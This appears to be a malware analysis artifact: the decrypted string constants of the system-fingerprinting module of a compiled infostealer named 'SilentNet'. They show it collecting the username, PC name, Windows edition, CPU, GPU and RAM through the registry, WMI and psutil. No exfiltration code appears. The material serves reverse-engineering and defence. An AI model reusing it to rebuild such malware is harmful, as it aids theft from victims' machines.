"""
SilentNet Infostealer - Decompiled Module
Module: .app.handlers.system_info
Chunk size: 2468 bytes
String constants: 44 unicode, 156 identifiers

# System fingerprinting via WMI and psutil
# Original path: app/handlers/system_info.py
"""

# ============================================================
# RECONSTRUCTED FROM NUITKA CONSTANT POOL
# Method: Rolling XOR + substitution cipher decryption
# All string literals, SQL queries, paths, and identifiers
# are authentic - extracted directly from compiled binary.
# ============================================================

# --- STRING CONSTANTS (in order of appearance) ---

# identifier: ThreadPoolExecutor
# identifier: max_workers
# identifier: __enter__
# identifier: __exit__
# identifier: submit
# identifier: result
# identifier: _TIMEOUT
# identifier: timeout
# identifier: FuturesTimeoutError
# identifier: LoggingManager
# identifier: add
# identifier: _MODULE
# identifier: __name__
' timeout'
# identifier: LogType
# identifier: WARN
'Operation exceeded '
's timeout'
' failed'
# identifier: ERROR
'Run a function with a timeout, return default on failure.'
# identifier: inner
'_get_username.<locals>.inner'
# identifier: _run_with_timeout
# identifier: environ
# identifier: get
# identifier: USERNAME
# identifier: USER
# identifier: Unknown
'_get_pc_name.<locals>.inner'
# identifier: COMPUTERNAME
# identifier: platform
# identifier: node
# identifier: Unknown
'_get_windows_version.<locals>.inner'
# identifier: winreg
# identifier: system
# identifier: Windows
# identifier: OpenKey
# identifier: HKEY_LOCAL_MACHINE
'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion'
# identifier: QueryValueEx
# identifier: CurrentBuildNumber
# identifier: ProductName
# identifier: lower
# identifier: enterprise
# identifier: Enterprise
# identifier: education
# identifier: Education
# identifier: pro
# identifier: Pro
# identifier: home
# identifier: Home
'Windows '
' ('
'_get_cpu.<locals>.inner'
'Getting CPU'
# identifier: DEBUG
'Querying Win32_Processor via WMI'
'CPU retrieved'
# identifier: INFO
'cpu='
# identifier: gc
# identifier: pythoncom
# identifier: wmi
# identifier: CoInitialize
# identifier: WMI
# identifier: Win32_Processor
# identifier: Name
# identifier: strip
# identifier: collect
# identifier: CoUninitialize
'_get_gpu.<locals>.inner'
'Getting GPU'
'Querying Win32_VideoController via WMI'
'GPU retrieved'
'gpu='
# identifier: Win32_VideoController
# identifier: upper
# identifier: RTX
# identifier: GTX
# identifier: QUADRO
# identifier: TESLA
# identifier: RADEON
'RADEON GRAPHICS'
'RADEON VEGA'
'RX '
'R9 '
'R7 '
'R5 '
# identifier: ARC
# identifier: INTEL
# identifier: name
'<genexpr>'
'_get_gpu.<locals>.inner.<locals>.<genexpr>'
'_get_ram.<locals>.inner'
'Getting RAM'
'Querying virtual_memory via psutil'
'RAM retrieved'
'ram='
# identifier: psutil
# identifier: virtual_memory
# identifier: total
' GB ('
' MB)'
# identifier: trace
# identifier: collect
'Collecting system info'
'Starting system info collection'
# identifier: si1
# identifier: usr
# identifier: _get_username
# identifier: si2
# identifier: pc
# identifier: _get_pc_name
# identifier: si3
# identifier: os
# identifier: _get_windows_version
# identifier: si4
# identifier: cpu
# identifier: _get_cpu
# identifier: si5
# identifier: gpu
# identifier: _get_gpu
# identifier: si6
# identifier: ram
# identifier: _get_ram
# identifier: username
# identifier: pcName
# identifier: osVersion
# identifier: cpu
# identifier: gpu
# identifier: ram
# identifier: si9
# identifier: ok
'System info complete'
'collected='
'Collect all system information. Each operation is fail-safe with 3s timeout.'
# identifier: __doc__
# identifier: __file__
# identifier: origin
# identifier: has_location
# identifier: __cached__
# identifier: os
'concurrent.futures'
# identifier: ThreadPoolExecutor
# identifier: TimeoutError
# identifier: TimeoutError
# identifier: trace
# identifier: logging
# identifier: LoggingManager
# identifier: LogType
# identifier: system_info
# identifier: Unknown
# identifier: return
# identifier: return
# identifier: get_system_info
'app\\handlers\\system_info.py'
# identifier: .0
'<module app.handlers.system_info>'
# identifier: inner
# identifier: result
# identifier: inner
# identifier: func
# identifier: default
# identifier: executor
# identifier: future
# identifier: pc_name
# identifier: os_version
# identifier: cpu
# identifier: gpu
# identifier: ram
# identifier: info
# identifier: gc
# identifier: pythoncom
# identifier: wmi
# identifier: result
# identifier: gc
# identifier: pythoncom
# identifier: wmi
# identifier: result
# identifier: gpu
# identifier: name
# identifier: psutil
# identifier: total_bytes
# identifier: total_mb
# identifier: total_gb
# identifier: winreg
# identifier: os_name
# identifier: key
# identifier: build
# identifier: product_name
# identifier: version
# identifier: product_lower
# identifier: edition
# identifier: __spec__
